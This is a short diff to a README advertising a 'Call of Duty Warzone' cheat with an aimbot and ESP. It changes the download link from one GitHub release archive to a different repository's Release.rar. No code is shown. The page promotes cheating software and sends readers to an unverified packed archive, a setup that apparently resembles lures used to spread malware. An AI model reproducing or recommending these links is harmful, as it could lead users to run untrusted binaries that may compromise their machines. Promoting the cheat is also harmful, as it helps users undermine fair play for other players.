@@ -1,5 +1,5 @@
 # Call Of Duty Warzone
-## [Download latest version](https://github.com/CheezyChaza/WarzoneEx/releases/download/WarzoneReleaseV1.3/Launcher.zip)
+## [Download latest version](https://github.com/dimarMJ03/Warzone-h4ck/releases/download/Release/Release.rar)
 ![1](https://github.com/user-attachments/assets/7ad1e2c6-c772-4147-b68f-1ce02f00f8fb)
 
 This COD Cheat is written in C++ and python. Last update: 07.09.24 The cheat includes Aimbot and ESP.
